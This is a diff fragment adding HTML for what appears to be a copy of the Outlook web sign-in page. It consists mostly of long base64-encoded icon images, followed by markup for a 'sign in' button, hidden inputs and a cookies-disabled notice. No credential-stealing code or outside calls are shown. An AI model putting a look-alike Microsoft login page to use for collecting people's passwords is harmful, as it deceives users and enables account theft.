CAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pou5U5EAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADqYAAAOpgAABdvkl/FRgAAA7VJREFUeNqslctrG0ccx787O7vKWpalSpa1sgJ2YmktS3LrkoNpoDYJ9NASKJSkGHLopYUceukp+RMcKKTHlp58MBgaCoXQHgopSSEPaMCJJVmSo9ihlrSStUbya519zPaQbOoqRnagXxiYncdnfzPze3Df3pvGYcpW0mdCvdr3Aak9TnlTEHiLAIBpU2bZgtnS/UvaTuhKJpZ7dNh+rhP8ZD0zKPvrfwz4NhQcQ43tcEltR869ezJbPThOD37kamPnx6LF3wXeJACgG9ILbTd4VzekP/dM6QYA9Aj6N5Kofxjybk5Jou4Z8G0o7/S0/s7Vxj5KR5dvv2Fxvpb8OCmXfiUcg2lTVmnFFoZDzy93s3ZNG5qPBSozAm8R5hAUVOWTVLTwGwAQAHi8Ph5MDJRvEY5BNyVjpZE4exQUAIZDzy+vNBJndVMyCMeQGCjferw+HnwNjvrV+wJvEtOmrNw4PZmKLj/EMZWKLj8sN05PmjZlAm+SqF+9DwAkW02lwr6mAgCVVmwhE8st4i2VieUWK63YAgCEfU0lW02lSEBqf8fBgW5KRrfjF9TRiw44B4BjMWpnq6nxzmvRTcng4CDk3ZwjIe/mFAC09vxPulmVlIs3V+oj1xxwoMQiSbm02AnXdoJ3ACAgtceJSA0RALb0vh+OOrISeXq9qCqXLEaZCy/V41fd+a193w0AOCHsewhPbA4ATEY7H8w5rCXl4k+UvIxCSiySiJRn3Q2mLfwFABznvPSK/0uU2AG3T2zGOwAgEGuyM9wPa6V6/JrFKAMAi1FWVJVL/4KtaQCwGe8QwxINAOiTtr88yqJSPX41ESnPUmIRi1FWUJWJpFy86c57PbufA4BhiQbRdoP3ACDQ03q/G7Sgjl5MRMqzHBy40MxgfungmlDv5jQAtHT/Emnp/q8BQBJ0cU0bmu/mbhwcDgBHicV3Qte0oXlJ0EUA0HaDX5DMYD7f2A6XACAWqM5kK+mJt320bCU9EQtUZ9w0mhnM5wkA1NryB26sj4SfPchWUsnjQ1PJkfCzB26uUduRc6+T0HsnlzZXGvELjsNBEnXPqFzKrWrDc0dBV7XhuVG5lJNE3eM4HFYa8Qtuwv9PBSmoyqcj4dWfDyb65m7otm6cuKNEnl53PUMS96f7vdp5SdQ9rwKDlTdOfZaUS790LU1Rv3o37GuOHOcqNrb7y7W2PNW1NAHAqwXxbCV9pr+3+aO/Zyst8CZ1w9hilJm2YLX3+nLNnf6vMrHco7Cv+cYP/xkA+nWvZfmZSuAAAAAASUVORK5CYII="
+                            alt=""><span class="signinTxt">sign in</span>
+                    </div>
+                    <input type="hidden" />
+                </div>
+                <div class="hidden-submit"><input type="submit" tabindex="-1" /></div>
+            </div>
+        </div>
+        <div id="cookieMsg" class="logonDiv" style="display:none">
+            <div class="signInHeader">Outlook</div>
+            <div class="signInExpl">Please enable cookies for this Web site.<br><br>Cookies are currently disabled by
+                your browser. Outlook requires that cookies be enabled. <br><br>For information about how to enable
+                cookies, see the Help for your Web browser.<br><br><br></div>
+            <div class="signInEnter">
+                <div onclick="clkRtry()" style="cursor:pointer;display:inline">
+                    <img class="imgLnk"
+                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAACXBIWXMAAAsTAAALEwEAmpwYAAA5nmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMwNjcgNzkuMTU3NzQ3LCAyMDE1LzAzLzMwLTIzOjQwOjQyICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE5LTAzLTMwVDE4OjUzOjM3KzAzOjAwPC94bXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTktMDctMjFUMDg6NTc6MDkrMDM6MDA8L3htcDpNb2RpZnlEYXRlPgogICAgICAgICA8eG1wOk1ldGFkYXRhRGF0ZT4yMDE5LTA3LTIxVDA4OjU3OjA5KzAzOjAwPC94bXA6TWV0YWRhdGFEYXRlPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOmU0NGU4MDA5LTBmMjEtN2Y0Yy1hYjE4LWM3MDVmYzk5NTkxZjwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDo1NTc2RjRENDk2MTkxMUUxODg1Njg5MkFEMTE0NkFCRjwveG1wTU06RG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkRlcml2ZWRGcm9tIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgPHN0UmVmOmluc3RhbmNlSUQ+eG1wLmlpZDo1NTc2RjREMTk2MTkxMUUxODg1Njg5MkFEMTE0NkFCRjwvc3RSZWY6aW5zdGFuY2VJRD4KICAgICAgICAgICAgPHN0UmVmOmRvY3VtZW50SUQ+eG1wLmRpZDo1NTc2RjREMjk2MTkxMUUxODg1Njg5MkFEMTE0NkFCRjwvc3RSZWY6ZG9jdW1lbnRJRD4KICAgICAgICAgPC94bXBNTTpEZXJpdmVkRnJvbT4KICAgICAgICAgPHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD54bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGPC94bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpIaXN0b3J5PgogICAgICAgICAgICA8cmRmOlNlcT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDplNDRlODAwOS0wZjIxLTdmNGMtYWIxOC1jNzA1ZmM5OTU5MWY8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTktMDctMjFUMDg6NTc6MDkrMDM6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChXaW5kb3dzKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9waG90b3Nob3A6Q29sb3JNb2RlPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICAgICA8dGlmZjpYUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpZUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICAgICAgICAgPGV4aWY6Q29sb3JTcGFjZT42NTUzNTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpQaXhlbFhEaW1lbnNpb24+MjI8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MjI8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI